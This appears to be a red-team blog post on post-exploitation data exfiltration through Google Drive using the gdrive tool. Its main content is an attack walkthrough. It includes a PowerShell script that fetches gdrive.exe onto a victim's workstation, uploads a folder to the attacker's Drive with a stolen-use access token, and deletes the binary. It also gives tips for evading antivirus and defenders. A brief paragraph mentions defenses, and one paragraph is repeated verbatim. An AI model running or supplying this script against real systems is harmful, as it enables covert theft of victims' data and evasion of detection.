---
title: "Stealthy and Efficient Data Exfiltration using Google Drive"
categories: 
  - exfiltration
tags:
  - red team
  - post exploitation
  - google drive
toc: false
---

Data exfiltration is a continual process during the post-exploitation stage. After initial entry, the attacker targets the domain admins. The attackers often map the network and use stolen credentials to authenticate into other workstations, continuing the process until the domain admin credentials are found. Throughout this process, as the attacker gains access to additional workstations and domains, data exfiltration is performed.

To help with this process, an attacker can use gdrive, a legitiment command line tool that uses the Google Drive API to perform typical tasks done in the Google Drive web app, such as uploading a file or folder. Gdrive is written in Go and offers precompiled executables for multiple OS, which are not flagged by anti-virus. An attacker can use this useful tool to upload data on the victim's workstation to the attacker's Google Drive account. The stolen data can then be viewed in a web browser or downloaded on the attacker's server using the same tool. This tool works with all Google Drive accounts. Furthermore, certain Google Drive accounts, including those offered by some universities, have unlimited storage. This makes Google Drive an appealing method for data exfiltration.

First the attacker needs to obtain the OAUTH access token to Google Drive. When first run, gdrive gives an url for the user to visit, where Gdrive will prompt for access rights. While this can be done interactively on the victim's PC, it is best to perform this on the server, and then save the access token using the --config flag. The access token can then be used on the victim's PC using the --access-token paremeter on the victim's PC to skip this process and get straight to the exfiltration.

Opening the link:
<figure>
	<a href="/assets/images/78c319d8f22bba24031791059e52eac7.png"><img src="/assets/images/78c319d8f22bba24031791059e52eac7.png"></a>
</figure>
First the attacker needs to obtain the OAUTH access token to Google Drive. When first run, gdrive gives an url for the user to visit, where Gdrive will prompt for access rights. While this can be done interactively on the victim's PC, it is best to perform this on the server, and then save the access token using the --config flag. The access token can then be used on the victim's PC using the --access-token paremeter on the victim's PC to skip this process and get straight to the exfiltration.

Data exfiltration is extremely difficult to detect when the attacker uses legitimate channels, such as cloud storage. Outbound SSL Decryption using a SSL Forward Proxy gives the defenders greater visibility. Furthermore, defenders can fine-tune their IDS to better detect data exfiltration. It is important to stress defense in depth, as no single solution is enough.

The config file is saved to the folder "test." View the token_v2.json file to get the access token that will be used on the victim's workstation.

Now that the access token is configured, it's time to download and run gdrive on the victim's workstation and exfiltrate the data. I will download the .exe for Windows 32 bits from Google Drive to disk, and a folder "C:/temp/test" will be exfiltrated. The --recursive flag uploads a directory rather than a file. If the program is detected by antivirus in the future, the powershell script Invoke-ReflectivePEInjection can be used to download and run the .exe in memory rather than disk. The following script is Powershell 2.0 compatable.

```
$path='c:\temp\test'
(New-Object System.Net.WebClient).DownloadFile("https://docs.google.com/uc?id=0B3X9GlR6EmbnV3RNeFVUQjZvS2c&export=download","c:\windows\temp\gdrive.exe")
& "c:\windows\temp\gdrive.exe" upload $path --recursive --access-token 'access token from config'
rm "c:\windows\temp\gdrive.exe"
```

The exfiltrated data can be downloaded on the attacker's server or viewed in the browser with Google Drive. Because the access token could potentially get logged by the network defenders, the attacker should immediately invalidate the token by revoking GDrive from accessing Google Drive: [https://myaccount.google.com/permissions?pli=1](https://myaccount.google.com/permissions?pli=1)